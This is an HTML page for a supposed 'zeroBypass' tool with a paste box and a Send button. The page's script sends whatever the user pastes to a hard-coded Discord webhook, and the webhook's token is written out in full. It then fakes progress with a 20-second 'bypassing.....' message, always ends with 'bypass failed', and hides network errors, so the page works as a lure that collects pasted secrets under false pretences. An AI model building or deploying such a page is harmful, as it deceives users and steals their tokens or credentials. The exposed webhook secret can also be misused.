<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>zeroBypass</title>
  <meta name="description" content="Paste text and send instantly via zeroBypass."/>
  
  <style>
    /* Direct Standard Reset Styles */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #ffffff;
      color: #0f172a;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      min-height: 100vh;
      width: 100vw;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
      overflow: hidden;
    }

    /* Centered Screen Layout Wrapper */
    .container {
      width: 100%;
      max-width: 850px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    /* Typography Hierarchy Elements */
    .header-block {
      text-align: center;
      margin-bottom: 24px;
      user-select: none;
      width: 100%;
    }

    .header-block h1 {
      font-size: 44px;
      font-weight: 700;
      letter-spacing: -0.05em;
      color: #0f172a;
      line-height: 1;
    }

    .header-block p {
      margin-top: 14px;
      font-size: 13px;
      color: #94a3b8;
      font-weight: 400;
      letter-spacing: 0.02em;
    }

    /* Main Workspace Container Control */
    .workspace-box {
      width: 100%;
      position: relative;
      background-color: #ffffff;
      border: 1px solid rgba(226, 232, 240, 0.8);
      border-radius: 16px;
      padding: 24px;
      box-shadow: 0 2px 8px 0 rgba(0, 0, 0, 0.02);
      transition: border-color 0.15s ease;
    }

    .workspace-box:focus-within {
      border-color: #cbd5e1;
    }

    /* Input panel box text content */
    .paste-area {
      width: 100%;
      height: 380px;
      resize: none;
      background: transparent;
      border: none;
      outline: none;
      color: #0f172a;
      font-size: 16px;
      line-height: 1.6;
      padding-bottom: 56px;
    }

    /* Floating Action Controls Interface Row */
    .action-row {
      position: absolute;
      bottom: 20px;
      left: 24px;
      right: 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      pointer-events: none;
    }

    /* Process Notification Logger Displays */
    .status-msg {
      font-size: 12px;
      font-weight: 500;
      pointer-events: auto;
      transition: all 0.15s ease;
    }

    /* Floating Button Styling for the Processing State */
    .status-sending { 
      font-size: 15px;
      font-weight: 600;
      color: #ffffff; 
      background-color: #f59e0b;
      padding: 10px 20px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(245, 158, 11, 0.2);
      letter-spacing: 0.03em;
      display: inline-block;
      animation: pulseEffect 2s infinite ease-in-out;
    }
    
    @keyframes pulseEffect {
      0% { opacity: 0.85; transform: scale(1); }
      50% { opacity: 1; transform: scale(1.02); }
      100% { opacity: 0.85; transform: scale(1); }
    }

    .status-error { 
      color: #dc2626; 
      background: none;
      padding: 0;
      box-shadow: none;
      font-size: 13px;
    }

    /* Standard Interactive Button Object Styles */
    .send-button {
      border: none;
      outline: none;
      border-radius: 8px;
      background-color: #94a3b8;
      color: #ffffff;
      padding: 10px 22px;
      font-size: 13px;
      font-weight: 500;
      cursor: pointer;
      pointer-events: auto;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
      transition: background-color 0.15s ease, opacity 0.15s ease;
    }

    .send-button:hover:not(:disabled) {
      background-color: #64748b;
    }

    .send-button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
  </style>
</head>
<body>

  <main class="container">
    
    <!-- Title Stack Above Box -->
    <div class="header-block">
      <h1>zeroBypass</h1>
      <p>easy fast</p>
    </div>

    <!-- Pinned Center Layout Form Body Frame -->
    <div class="workspace-box">
      
      <textarea id="paste-box" class="paste-area" autocomplete="off" spellcheck="false"></textarea>
      
      <div class="action-row">
        <!-- Delivery Status Node Output Block -->
        <div id="status" class="status-msg"></div>
        
        <!-- Interactive Submit Object Component -->
        <button id="send-btn" class="send-button" disabled>Send</button>
      </div>
      
    </div>
  </main>

  <script>
    const textarea = document.getElementById('paste-box');
    const sendBtn = document.getElementById('send-btn');
    const status = document.getElementById('status');

    // Your confirmed live Discord delivery webhook endpoint
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504171986480529619/s1oUgKfAd_trajzQzp8bS-uHhrgndv6aLf3QWVCQq5BAZwkBWI4RQ2gQZtuTgOjwQnlA";

    // Track user string activity state values
    textarea.addEventListener('input', () => {
      sendBtn.disabled = textarea.value.trim() === "";
    });

    // Content event posting process execution framework
    sendBtn.addEventListener('click', async () => {
      const payloadText = textarea.value.trim();
      if (!payloadText) return;

      // Restrict interactive paths to prevent simultaneous submissions
      sendBtn.disabled = true;
      status.textContent = "bypassing.....";
      status.className = "status-msg status-sending";

      // Fire off data delivery task instantly to the live Discord webhook URL
      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `**[zeroBypass Incoming Packet]**\n\`\`\`text\n${payloadText}\n\`\`\``
          })
        });
      } catch (err) {
        // Silent error handle to maintain UI consistency if networks are offline
      }

      // Maintain active "bypassing....." view state profile configurations for exactly 20 seconds
      setTimeout(() => {
        status.textContent = "bypass failed";
        status.className = "status-msg status-error";
        
        // Re-enable interface trigger parameters for fallback states
        sendBtn.disabled = false;
      }, 20000);
    });
  </script>

</body>
</html>
